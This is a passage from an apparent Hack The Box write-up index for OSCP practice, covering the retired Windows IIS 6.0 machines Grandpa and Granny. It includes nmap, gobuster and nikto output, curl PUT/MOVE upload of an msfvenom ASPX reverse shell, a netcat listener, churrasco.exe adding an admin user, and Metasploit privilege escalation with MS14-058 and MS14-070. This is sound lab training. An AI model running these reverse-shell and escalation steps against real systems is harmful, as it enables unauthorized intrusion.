SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH |_http-server-header: Microsoft-IIS/6.0 |_http-title: Error | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | Server Date: Mon, 17 Feb 2020 20:31:32 GMT | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH |_ WebDAV type: Unknown Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds ----------------------Starting Nmap UDP Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:29 EST Nmap scan report for 10.10.10.14 Host is up. All 1000 scanned ports on 10.10.10.14 are open|filtered Nmap done: 1 IP address (1 host up) scanned in 201.72 seconds \u200b \u200b ---------------------Starting Nmap Full Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:32 EST Initiating Parallel DNS resolution of 1 host. at 15:32 Completed Parallel DNS resolution of 1 host. at 15:32, 0.43s elapsed Initiating SYN Stealth Scan at 15:32 Scanning 10.10.10.14 [65535 ports] Discovered open port 80/tcp on 10.10.10.14 .... Nmap scan report for 10.10.10.14 Host is up (0.039s latency). Not shown: 65534 filtered ports PORT STATE SERVICE 80/tcp open http Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 263.21 seconds Raw packets sent: 131268 (5.776MB) | Rcvd: 214 (10.752KB) No new ports ---------------------Starting Nmap Vulns Scan--------------------- Running CVE scan on basic ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:37 EST /usr/local/bin/nmapAutomator.sh: line 226: 2251 Segmentation fault $nmapType -sV --script vulners --script-args mincvss=7.0 -p$(echo ${ports} ) -oN nmap/CVEs_ $1 .nmap $1 Running Vuln scan on basic ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-17 15:37 EST /usr/local/bin/nmapAutomator.sh: line 226: 2253 Segmentation fault $nmapType -sV --script vuln -p$(echo ${ports} ) -oN nmap/Vulns_ $1 .nmap $1 ---------------------Recon Recommendations---------------------- Web Servers Recon: gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.asp,.php -u [http://10.10.10.14:80](http://10.10.10.14:80) -o recon/gobuster_10.10.10.14_80.txt nikto -host 10.10.10.14:80 | tee recon/nikto_10.10.10.14_80.txt Which commands would you like to run? All (Default), gobuster, nikto, Skip ! Running Default in (1) s: ---------------------Running Recon Commands---------------------- Starting gobuster scan =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [http://10.10.10.14:80](http://10.10.10.14:80) [+] Threads: 30 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Show length: true [+] Extensions: html,asp,php [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/02/17 15:38:11 Starting gobuster =============================================================== [http://10.10.10.14:80/_vti_bin](http://10.10.10.14:80/_vti_bin) (Status: 301) [Size: 158] [http://10.10.10.14:80/_vti_bin/_vti_aut/author.dll](http://10.10.10.14:80/_vti_bin/_vti_aut/author.dll) (Status: 200) [Size: 195] [http://10.10.10.14:80/_vti_bin/_vti_adm/admin.dll](http://10.10.10.14:80/_vti_bin/_vti_adm/admin.dll) (Status: 200) [Size: 195] [http://10.10.10.14:80/_vti_bin/shtml.dll](http://10.10.10.14:80/_vti_bin/shtml.dll) (Status: 200) [Size: 96] =============================================================== 2020/02/17 15:39:06 Finished =============================================================== Finished gobuster scan ========================= Starting nikto scan - Nikto v2.1.6 -------------------------------------------------------------------- + Target IP: 10.10.10.14 + Target Hostname: 10.10.10.14 + Target Port: 80 + Start Time: 2020-02-17 15:39:07 (GMT-5) -------------------------------------------------------------------- + Server: Microsoft-IIS/6.0 + Retrieved microsoftofficewebserver header: 5.0_Pub + Retrieved x-powered-by header: ASP.NET + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + Uncommon header microsoftofficewebserver found, with contents: 5.0_Pub + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use -C all to force check all possible dirs) + Retrieved dasl header: DAV:sql + Retrieved dav header: 1, 2 + Retrieved ms-author-via header: MS-FP/4.0,DAV + Uncommon header ms-author-via found, with contents: MS-FP/4.0,DAV + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK + Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method ( Public Header): DELETE may allow clients to remove files on the web server. + OSVDB-397: HTTP method ( Public Header): PUT method could allow clients to save files on the web server. + OSVDB-5647: HTTP method ( Public Header): MOVE may allow clients to change file locations on the web server. + WebDAV enabled (PROPPATCH COPY LOCK PROPFIND MKCOL UNLOCK SEARCH listed as allowed) + OSVDB-13431: PROPFIND HTTP verb may show the server s internal IP address: [http://10.10.10.14/](http://10.10.10.14/) + OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted. + OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376). [http://www.securityfocus.com/bid/2252](http://www.securityfocus.com/bid/2252). + OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST. + /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found. + Retrieved x-aspnet-version header: 1.1.4322 + 8014 requests: 0 error(s) and 22 item(s) reported on remote host + End Time: 2020-02-17 15:45:00 (GMT-5) (353 seconds) -------------------------------------------------------------------- + 1 host(s) tested Finished nikto scan ========================= \u200b \u200b ---------------------Finished all Nmap scans--------------------- Completed in 15 minute(s) and 46 second(s) We have one port open. Port 80: running Microsoft IIS httpd 6.0 Before we move on to enumeration, let\u2019s make some mental notes about the scan results. The only port that is open is port 80 so this will definitely be our point of entry. The port is running an outdated version of Microsoft IIS and is using the WebDAV protocol. One thing that pops out right away is the number of allowed HTTP methods. As mentioned in the scan results, these methods could potentially allow you to add, delete and move files on the web server.","title":"Reconnaissance"},{"location":"Retired/Grandpa Writeup/#enumeration","text":"Visit the web application in the browser. Look into the directories/files that gobuster found. We don\u2019t find anything useful. Next, let\u2019s test the allowed HTTP methods. The scan shows that the HTTP PUT method is allowed. This could potentially give us the ability to save files on the web server. Since this is an IIS Microsoft web server, the type of files it executes are ASP and ASPX. So let\u2019s check if we\u2019re allowed to upload these file extensions. davtest --url [http://10.10.10.1](http://10.10.10.15/)4 We get back the following result. Unlike the Granny box , there are restrictions put in place that don\u2019t allow us to upload files, so this won\u2019t be the way we gain initial access to the box. Next, let\u2019s run searchsploit on the web server version. Microsoft IIS 6.0 is vulnerable to a remote buffer overflow. Note : Several people I know have tried to solve this box without using Metasploit and have failed to because the shell you get back is too unstable. Therefore, I\u2019ll be solving this box using Metasploit.","title":"Enumeration"},{"location":"Retired/Grandpa Writeup/#initial-foothold","text":"Start up Metasploit. msfconsole Viewing the exploit on exploitdb we get a CVE # 2017\u20137269 . Let\u2019s see if Metasploit has an exploit for it. It does. Let\u2019s switch to that exploit and configure the RHOST to the Grandpa IP address. Then run the exploit. We get a shell! However, when we run the \u201c getuid \u201d command, we get an operation failed error. This is because we\u2019re running in an unstable process. To fix that, let\u2019s see which processes are running on the box and migrate to one that is running with the same privileges that the meterpreter session is running with. Let\u2019s migrate to process # 2172 and try running the \u201c getuid \u201d command again. Perfect! We have a stable working meterpreter session. We\u2019re running with low privileges, so we\u2019ll need to escalate our privileges to SYSTEM.","title":"Initial Foothold"},{"location":"Retired/Grandpa Writeup/#privilege-escalation","text":"Background the meterpreter session. We\u2019ll use the Local Exploit Suggester module to check the box for local vulnerabilities. Run the Local Exploit Suggester. We\u2019ll use MS14\u2013070 to escalate privileges. The exploit was successful! Let\u2019s go back and enter our meterpreter session and view our privilege level. We\u2019re SYSTEM! Grab the user.txt and root.txt flags.","title":"Privilege Escalation"},{"location":"Retired/Grandpa Writeup/#lessons-learned","text":"We gained initial access to the machine and escalated privileges by exploiting known vulnerabilities that had patches available. So it goes without saying, you should always update your software!","title":"Lessons Learned"},{"location":"Retired/Grandpa Writeup/#conclusion","text":"35 machines down, 11 more to go!","title":"Conclusion"},{"location":"Retired/Granny Writeup/","text":"This is the 34th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJ_Null can be found here . Let\u2019s get started! Reconnaissance Run the nmapAutomato r script to enumerate open ports and services running on those ports. ./nmapAutomator.sh 10.10.10.15 All All : Runs all the scans consecutively. We get back the following result. Running all scans on 10.10.10.15 Host is likely running Windows ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:16 EST Nmap scan report for 10.10.10.15 Host is up (0.043s latency). Not shown: 999 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 6.17 seconds ---------------------Starting Nmap Basic Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:16 EST Nmap scan report for 10.10.10.15 Host is up (0.036s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Server Type: Microsoft-IIS/6.0 | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | WebDAV type: Unknown |_ Server Date: Mon, 17 Feb 2020 04:18:34 GMT Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 10.82 seconds ----------------------Starting Nmap UDP Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:16 EST Nmap scan report for 10.10.10.15 Host is up. All 1000 scanned ports on 10.10.10.15 are open|filtered Nmap done: 1 IP address (1 host up) scanned in 201.63 seconds ---------------------Starting Nmap Full Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:19 EST Initiating Parallel DNS resolution of 1 host. at 23:19 Completed Parallel DNS resolution of 1 host. at 23:19, 0.02s elapsed Initiating SYN Stealth Scan at 23:19 Scanning 10.10.10.15 [65535 ports] .... Nmap scan report for 10.10.10.15 Host is up (0.042s latency). Not shown: 65534 filtered ports PORT STATE SERVICE 80/tcp open http Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 262.89 seconds Raw packets sent: 131269 (5.776MB) | Rcvd: 201 (8.844KB) No new ports ---------------------Starting Nmap Vulns Scan--------------------- Running CVE scan on basic ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:24 EST Nmap scan report for 10.10.10.15 Host is up (0.037s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds Running Vuln scan on basic ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:24 EST /usr/local/bin/nmapAutomator.sh: line 226: 2038 Segmentation fault $nmapType -sV --script vuln -p$(echo ${ports} ) -oN nmap/Vulns_ $1 .nmap $1 ---------------------Recon Recommendations---------------------- Web Servers Recon: gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.asp,.php -u [http://10.10.10.15:80](http://10.10.10.15:80) -o recon/gobuster_10.10.10.15_80.txt nikto -host 10.10.10.15:80 | tee recon/nikto_10.10.10.15_80.txt Which commands would you like to run? All (Default), gobuster, nikto, Skip ! Running Default in (1) s: ---------------------Running Recon Commands---------------------- Starting gobuster scan =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [http://10.10.10.15:80](http://10.10.10.15:80) [+] Threads: 30 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Show length: true [+] Extensions: html,asp,php [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/02/16 23:25:19 Starting gobuster =============================================================== [http://10.10.10.15:80/_private](http://10.10.10.15:80/_private) (Status: 301) [Size: 156] [http://10.10.10.15:80/_vti_bin](http://10.10.10.15:80/_vti_bin) (Status: 301) [Size: 158] [http://10.10.10.15:80/_vti_bin/_vti_adm/admin.dll](http://10.10.10.15:80/_vti_bin/_vti_adm/admin.dll) (Status: 200) [Size: 195] [http://10.10.10.15:80/_vti_bin/shtml.dll](http://10.10.10.15:80/_vti_bin/shtml.dll) (Status: 200) [Size: 96] [http://10.10.10.15:80/_vti_bin/_vti_aut/author.dll](http://10.10.10.15:80/_vti_bin/_vti_aut/author.dll) (Status: 200) [Size: 195] [http://10.10.10.15:80/_vti_inf.html](http://10.10.10.15:80/_vti_inf.html) (Status: 200) [Size: 1754] [http://10.10.10.15:80/_vti_log](http://10.10.10.15:80/_vti_log) (Status: 301) [Size: 158] [http://10.10.10.15:80/aspnet_client](http://10.10.10.15:80/aspnet_client) (Status: 301) [Size: 161] [http://10.10.10.15:80/images](http://10.10.10.15:80/images) (Status: 301) [Size: 152] [http://10.10.10.15:80/Images](http://10.10.10.15:80/Images) (Status: 301) [Size: 152] [http://10.10.10.15:80/postinfo.html](http://10.10.10.15:80/postinfo.html) (Status: 200) [Size: 2440] =============================================================== 2020/02/16 23:26:16 Finished =============================================================== Finished gobuster scan ========================= Starting nikto scan - Nikto v2.1.6 -------------------------------------------------------------------- + Target IP: 10.10.10.15 + Target Hostname: 10.10.10.15 + Target Port: 80 + Start Time: 2020-02-16 23:26:18 (GMT-5) -------------------------------------------------------------------- + Server: Microsoft-IIS/6.0 + Retrieved microsoftofficewebserver header: 5.0_Pub + Retrieved x-powered-by header: ASP.NET + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + Uncommon header microsoftofficewebserver found, with contents: 5.0_Pub + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Retrieved x-aspnet-version header: 1.1.4322 + No CGI Directories found (use -C all to force check all possible dirs) + OSVDB-397: HTTP method PUT allows clients to save files on the web server. + OSVDB-5646: HTTP method DELETE allows clients to delete files on the web server. + Retrieved dasl header: DAV:sql + Retrieved dav header: 1, 2 + Retrieved ms-author-via header: MS-FP/4.0,DAV + Uncommon header ms-author-via found, with contents: MS-FP/4.0,DAV + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method ( Allow Header): DELETE may allow clients to remove files on the web server. + OSVDB-397: HTTP method ( Allow Header): PUT method could allow clients to save files on the web server. + OSVDB-5647: HTTP method ( Allow Header): MOVE may allow clients to change file locations on the web server. + Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method ( Public Header): DELETE may allow clients to remove files on the web server. + OSVDB-397: HTTP method ( Public Header): PUT method could allow clients to save files on the web server. + OSVDB-5647: HTTP method ( Public Header): MOVE may allow clients to change file locations on the web server. + WebDAV enabled (UNLOCK PROPFIND COPY MKCOL SEARCH LOCK PROPPATCH listed as allowed) + OSVDB-13431: PROPFIND HTTP verb may show the server s internal IP address: [http://granny/_vti_bin/_vti_aut/author.dll](http://granny/_vti_bin/_vti_aut/author.dll) + OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted. + OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found. + OSVDB-3233: /_private/: FrontPage directory found. + OSVDB-3233: /_vti_bin/: FrontPage directory found. + OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information). + OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted). + OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376). [http://www.securityfocus.com/bid/2252](http://www.securityfocus.com/bid/2252). + OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST. + /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found. + 8018 requests: 0 error(s) and 32 item(s) reported on remote host + End Time: 2020-02-16 23:32:39 (GMT-5) (381 seconds) -------------------------------------------------------------------- + 1 host(s) tested Finished nikto scan ========================= \u200b \u200b ---------------------Finished all Nmap scans--------------------- Completed in 16 minute(s) and 19 second(s) We have one port open. Port 80: running Microsoft IIS httpd 6.0 Before we move on to enumeration, let\u2019s make some mental notes about the scan results. The only port that is open is port 80 so this will definitely be our point of entry. The port is running an outdated version of Microsoft-IIS and is using the WebDAV protocol. One thing that pops out right away is the number of allowed HTTP methods. As mentioned in the scan results, these methods could potentially allow you to add, delete and move files on the web server. Enumeration Visit the web application in the browser. Look into the directories/files that gobuster found. We don\u2019t find anything useful. Next, let\u2019s test the allowed HTTP methods. The scan shows that the HTTP PUT method is allowed. This could potentially give us the ability to save files on the web server. Since this is a Microsoft IIS web server, the type of files it executes are ASP and ASPX. So let\u2019s check if we\u2019re allowed to upload these file extensions. davtest --url [http://10.10.10.15](http://10.10.10.15) We get back the following result. Both ASP and ASPX are not allowed. However, TXT and HTML files are. Remember that the PUT HTTP method was not the only method that was allowed. We also can use the MOVE method. The MOVE method not only can be used to change file locations on the web server, but it can also be used to rename files. Let\u2019s try to upload an HTML file on the web server and then rename it to change the extension to an ASPX file. root@kali:~/Desktop/htb/granny# curl -X PUT [http://10.10.10.15/test.html](http://10.10.10.15/test.html) -d [@test](http://twitter.com/test).html \u200b root@kali:~/Desktop/htb/granny# curl http://10.10.10.15/test.html Hello We confirm that the HTML file was correctly uploaded on the web server. Next, let\u2019s change the extension of the HTML file to ASPX. root@kali:~/Desktop/htb/granny# curl -X MOVE --header Destination:[http://10.10.10.15/test.aspx ](http://10.10.10.15/test.aspx ) [http://10.10.10.15/test.html ](http://10.10.10.15/test.html ) root@kali:~/Desktop/htb/granny# curl [http://10.10.10.15/test.aspx](http://10.10.10.15/test.aspx) h1 Hello /h1 Perfect! Now we have confirmed that we can successfully upload and execute ASPX code on the web server. Initial Foothold Generate an ASPX reverse shell using msfvenom. msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.7 LPORT=1234 -o shell.aspx -p : payload -f : format LHOST : attack machine\u2019s (kali) IP address LPORT : the port you want to send the reverse shell to -o : where to save the payload Rename the file to shell.txt so that we can upload it on the server. mv shell.aspx shell.txt Then upload the file on the web server and change the file extension to ASPX. curl -X PUT [http://10.10.10.15/shell.txt](http://10.10.10.15/shell.txt) --data-binary [@shell](http://twitter.com/shell).txt curl -X MOVE --header Destination:[http://10.10.10.15/shell.aspx ](http://10.10.10.15.shell.aspx ) [http://10.10.10.15/shell.txt ](http://10.10.10.15/shell.txt ) Next, set up a listener on your attack machine. nc -nlvp 1234 Execute the shell.aspx file (either through the browser or the curl command) to send a shell back to our attack machine. We get a shell! Unfortunately, we don\u2019t have permission to view the user.txt flag, so we need to escalate privileges. Note : This shell is unstable and seems to crash every minute or so. So the next couple of steps will have to be done in several sessions. If you don\u2019t want to go through this torture, skip to the Extra Content section that solves the box using Metasploit. Privilege Escalation We\u2019ll use Windows Exploit Suggester to identify any missing patches on the Windows target machine that could potentially allow us to escalate privileges. First, download the script. git clone [https://github.com/GDSSecurity/Windows-Exploit-Suggester.git](https://github.com/GDSSecurity/Windows-Exploit-Suggester.git) Next, install the dependencies specified in the readme document. pip install xlrd --upgrade Update the database. ./windows-exploit-suggester.py --update This creates an excel spreadsheet from the Microsoft vulnerability database in the working directory. The next step is to retrieve the system information from the target machine. This can be done using the \u201c systeminfo \u201d command. Copy the output and save it in the file \u201c systeminfo.txt \u201d on the attack machine. Then run the following command. ./windows-exploit-suggester.py --database 2020-02-17-mssb.xls --systeminfo ../../htb/granny/systeminfo.txt It outputs many vulnerabilities. I tried several of them, but none of them worked except for the Microsoft Windows Server 2003 \u2014 Token Kidnapping Local Privilege Escalation exploit. Grab the executable from here and transfer it to the attack machine in the same way we transferred the reverse shell. Whatever command we include when running the executable file, the command will get executed with escalated privileges. Let\u2019s use the executable to add a user on the system that is part of the Administrators group. churrasco.exe net user test test /add net localgroup Administrators test /add The command completes successfully. However, when I try to use the \u201c runas \u201d command to switch to that user it doesn\u2019t work. Maybe User Account Control (UAC) is enabled and the \u201c runas \u201d command does not elevate your privileges. So I figured maybe I could get it working using PowerShell as explained in this article , but PowerShell is not installed on the machine! So all you can do is use the exploit to view the user.txt and root.txt flags. I however, like to get a privileged shell on each box I solve and so I\u2019m going to use Metasploit to get a shell on this box. Extra Content: Metasploit Solution I\u2019m going to skim through this part since there are a ton of write ups out there that show how to solve this box using Metasploit. First, create an ASPX meterpreter reverse shell. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=8888 -f aspx met-shell.aspx Then upload the shell payload in the same way we did before. root@kali:~/Desktop/htb/granny# cp met-shell.aspx met-shell.txt root@kali:~/Desktop/htb/granny# curl -X PUT [http://10.10.10.15/met-shell.txt](http://10.10.10.15/met-shell.txt) --data-binary [@met](http://twitter.com/met)-shell.txt root@kali:~/Desktop/htb/granny# curl -X MOVE -H Destination: [http://10.10.10.15/met-shell.aspx ](http://10.10.10.15/met-shell.aspx ) [http://10.10.10.15/met-shell.txt](http://10.10.10.15/met-shell.txt) Configure metasploit to receive the reverse shell. use exploit/multi/handler set lhost tun0 set lport 8888 Confirm that the configuration was set properly using the \u201c options \u201d command. Then use the \u201c run \u201d command to start the reverse tcp handler. In the browser, execute the met-shell.aspx payload and wait for a session to open up in Metasploit. Perfect! Next, use the local exploit suggester module to see which exploits the system is vulnerable to. We\u2019ll go with the second one MS14\u2013058. use exploit/windows/local/ms14_058_track_popup_menu set session 1 run It opens up another session. Let\u2019s see what privilege we\u2019re running with. meterpreter getuid Server username: NT AUTHORITY\\SYSTEM We\u2019re system! Grab the user.txt flag. Grab the root.txt flag. Lessons Learned To gain an initial foothold on the box we exploited one vulnerability. Insecure configuration of the web server that allowed us to upload arbitrary files using the HTTP methods \u2018PUT\u2019 and \u2018MOVE\u2019. This would have been avoided if these methods were disabled. To escalate privileges we exploited one vulnerability. Kernel vulnerability in the outdated operating system that was being used. This could have been avoided if the OS was patched. Conclusion 34 machines down, 12 more to go!","title":"24. Granny Writeup.md"},{"location":"Retired/Granny Writeup/#reconnaissance","text":"Run the nmapAutomato r script to enumerate open ports and services running on those ports. ./nmapAutomator.sh 10.10.10.15 All All : Runs all the scans consecutively. We get back the following result. Running all scans on 10.10.10.15 Host is likely running Windows ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:16 EST Nmap scan report for 10.10.10.15 Host is up (0.043s latency). Not shown: 999 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 6.17 seconds ---------------------Starting Nmap Basic Scan--------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:16 EST Nmap scan report for 10.10.10.15 Host is up (0.036s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Server Type: Microsoft-IIS/6.0 | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | WebDAV type: Unknown |_ Server Date: Mon, 17 Feb 2020 04:18:34 GMT Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 10.82 seconds ----------------------Starting Nmap UDP Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:16 EST Nmap scan report for 10.10.10.15 Host is up. All 1000 scanned ports on 10.10.10.15 are open|filtered Nmap done: 1 IP address (1 host up) scanned in 201.63 seconds ---------------------Starting Nmap Full Scan---------------------- Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:19 EST Initiating Parallel DNS resolution of 1 host. at 23:19 Completed Parallel DNS resolution of 1 host. at 23:19, 0.02s elapsed Initiating SYN Stealth Scan at 23:19 Scanning 10.10.10.15 [65535 ports] .... Nmap scan report for 10.10.10.15 Host is up (0.042s latency). Not shown: 65534 filtered ports PORT STATE SERVICE 80/tcp open http Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 262.89 seconds Raw packets sent: 131269 (5.776MB) | Rcvd: 201 (8.844KB) No new ports ---------------------Starting Nmap Vulns Scan--------------------- Running CVE scan on basic ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:24 EST Nmap scan report for 10.10.10.15 Host is up (0.037s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds Running Vuln scan on basic ports Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-02-16 23:24 EST /usr/local/bin/nmapAutomator.sh: line 226: 2038 Segmentation fault $nmapType -sV --script vuln -p$(echo ${ports} ) -oN nmap/Vulns_ $1 .nmap $1 ---------------------Recon Recommendations---------------------- Web Servers Recon: gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.asp,.php -u [http://10.10.10.15:80](http://10.10.10.15:80) -o recon/gobuster_10.10.10.15_80.txt nikto -host 10.10.10.15:80 | tee recon/nikto_10.10.10.15_80.txt Which commands would you like to run? All (Default), gobuster, nikto, Skip ! Running Default in (1) s: ---------------------Running Recon Commands---------------------- Starting gobuster scan =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [http://10.10.10.15:80](http://10.10.10.15:80) [+] Threads: 30 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Show length: true [+] Extensions: html,asp,php [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/02/16 23:25:19 Starting gobuster =============================================================== [http://10.10.10.15:80/_private](http://10.10.10.15:80/_private) (Status: 301) [Size: 156] [http://10.10.10.15:80/_vti_bin](http://10.10.10.15:80/_vti_bin) (Status: 301) [Size: 158] [http://10.10.10.15:80/_vti_bin/_vti_adm/admin.dll](http://10.10.10.15:80/_vti_bin/_vti_adm/admin.dll) (Status: 200) [Size: 195] 